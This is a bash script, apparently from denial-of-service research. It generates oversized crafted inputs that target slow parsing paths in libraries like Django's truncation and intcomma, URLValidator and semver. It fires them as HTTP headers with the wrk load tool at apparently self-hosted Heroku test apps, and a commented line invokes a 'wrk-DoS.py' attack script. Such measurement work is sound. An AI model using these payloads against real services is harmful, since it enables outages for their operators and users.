#!/bin/bash

create_string() {
    local char_length=$1
    local string=""
    for ((i = 0; i < char_length; i++)); do
        string+="x"  # Use '\t' to represent a tab character
    done
    echo "$string"
}

create_truncate_payload(){
    local char_length=$1
    local string=""
    for ((i = 0; i < char_length; i++)); do
        string+="<"  # Use '\t' to represent a tab character
    done
    echo "$string"
}


create_intcomma_payload(){
    local char_length=$1
    local string=""
    for ((i = 0; i < char_length; i++)); do
        string+="123"  # Use '\t' to represent a tab character
    done
    string+="a"
    echo "$string"
}

create_URLValidator_payload(){
    local char_length=$1
    local string="https://"
    for ((i = 0; i < char_length; i++)); do
        string+="x"  # Use '\t' to represent a tab character
    done
    string+=".com"
    echo "$string"
}



# Example usage
# length=10
# result=$(create_string $length)
# echo -e "$result"  # Use -e option to interpret escape sequences
# framework_names=("black" "django" "intcomma" "URLValidator" "embedchain");
# framework_names=("is_js" "lodash" "get_function_name" "email_check" "charset");
# framework_names=("cookiejar" "semver");
# framework_names=("celo" "semgrep")
framework_names=("semver")
timestamp=$(date +"%Y%m%d%H%M%S")

# Create a folder with the timestamp
folder_name="result_$timestamp"
# mkdir "$folder_name"
folder_name="result_20240602204608"

# framework_names=("intcomma");
for framework_name in ${framework_names[@]}; do
    # payload_length=(10000 50000) ;
    # payload_length=(10 25 100 1000 3000 5000 10000 50000) ;
    payload_length=(8000) ;
    for r in ${payload_length[@]}; do
        # url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com/$framework_name";
        url="https://wrk-node-cbefa003176b.herokuapp.com/$framework_name";
        benign_url="https://wrk-node-cbefa003176b.herokuapp.com"

        # url="http://127.0.0.1:80/$framework_name";
        # benign_url="http://127.0.0.1:80"
        result=$(create_string $r)
        if [ "$framework_name" = "black" ]; then
            result=$(create_string $r)
            benign_url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com"
            url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com/$framework_name"
        fi

        if [ "$framework_name" = "django" ]; then 
            result=$(create_truncate_payload $r)
            benign_url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com"
            url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com/$framework_name"
            # url="http://127.0.0.1:5000/$framework_name";
            # benign_url="http://127.0.0.1:5000"
        fi

        if [ "$framework_name" = "intcomma" ]; then
            z=$((r / 3))
            result=$(create_intcomma_payload $z)
            benign_url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com"
            url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com/$framework_name" 
        fi

        if [ "$framework_name" = "URLValidator" ]; then
            result=$(create_URLValidator_payload $r)
            benign_url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com"
            url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com/$framework_name"
        fi

        if [ "$framework_name" = "embedchain" ]; then
            result=$(create_string $r)
            benign_url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com"
            url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com/$framework_name"
        fi

        if [ "$framework_name" = "celo" ]; then
            result=$(create_string $r)
            benign_url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com"
            url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com/$framework_name"
        fi

        if [ "$framework_name" = "semgrep" ]; then
            result=$(create_string $r)
            benign_url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com"
            url="https://python-wrk-dos-297bbdc7a05a.herokuapp.com/$framework_name"
        fi
        # echo "$url";
        # python3 wrk-DoS.py -m 1 -t 15 -d 30 -H "payload:$result" --payload "data=example" -R 10 -u $benign_url -a $url -p $folder_name --attack-rate 10
        # heroku restart --app python-wrk-dos;
        # # heroku restart --app wrk-node;
        # echo "Going to sleep";
        # sleep 120;
        ./wrk -t1 -c100 -d10s -R100 -T5 $url -H "payload: $result" -m 1 -p $folder_name;
    done
done